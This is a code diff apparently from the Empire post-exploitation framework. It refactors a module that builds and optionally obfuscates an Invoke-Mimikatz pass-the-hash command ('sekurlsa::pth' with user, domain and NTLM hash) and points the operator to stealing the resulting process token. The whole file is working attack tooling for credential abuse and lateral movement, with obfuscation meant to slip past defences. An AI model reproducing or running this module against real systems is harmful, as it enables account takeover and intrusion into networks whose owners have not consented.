@@ -1,8 +1,7 @@
 from __future__ import print_function
 
 import pathlib
-from builtins import object
-from builtins import str
+from builtins import object, str
 from typing import Dict
 
 from empire.server.common import helpers
@@ -14,30 +13,28 @@ from empire.server.utils.module_util import handle_error_message
 
 class Module(object):
     @staticmethod
-    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
+    def generate(
+        main_menu,
+        module: PydanticModule,
+        params: Dict,
+        obfuscate: bool = False,
+        obfuscation_command: str = "",
+    ):
+
         # read in the common module source code
-        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
-        if main_menu.obfuscate:
-            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
-            if pathlib.Path(obfuscated_module_source).is_file():
-                module_source = obfuscated_module_source
+        script, err = main_menu.modules.get_module_source(
+            module_name=module.script_path,
+            obfuscate=obfuscate,
+            obfuscate_command=obfuscation_command,
+        )
 
-        try:
-            with open(module_source, 'r') as f:
-                module_code = f.read()
-        except:
-            return handle_error_message("[!] Could not read module source path at: " + str(module_source))
-
-        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
-            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
-                                         obfuscationCommand=main_menu.obfuscateCommand)
-        else:
-            script = module_code
+        if err:
+            return handle_error_message(err)
 
         # if a credential ID is specified, try to parse
         cred_id = params["CredID"]
         if cred_id != "":
-            
+
             if not main_menu.credentials.is_credential_valid(cred_id):
                 return handle_error_message("[!] CredID is invalid!")
 
@@ -56,18 +53,21 @@ class Module(object):
             print(helpers.color("[!] ntlm hash not specified"))
 
         # build the custom command with whatever options we want
-        command = "sekurlsa::pth /user:"+params["user"]
+        command = "sekurlsa::pth /user:" + params["user"]
         command += " /domain:" + params["domain"]
         command += " /ntlm:" + params["ntlm"]
 
         # base64 encode the command to pass to Invoke-Mimikatz
         script_end = "Invoke-Mimikatz -Command '\"" + command + "\"'"
 
-        script_end += ';"`nUse credentials/token to steal the token of the created PID."'
+        script_end += (
+            ';"`nUse credentials/token to steal the token of the created PID."'
+        )
 
-        if main_menu.obfuscate:
-            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
-        script += script_end
-        script = data_util.keyword_obfuscation(script)
-
+        script = main_menu.modules.finalize_module(
+            script=script,
+            script_end=script_end,
+            obfuscate=obfuscate,
+            obfuscation_command=obfuscation_command,
+        )
         return script
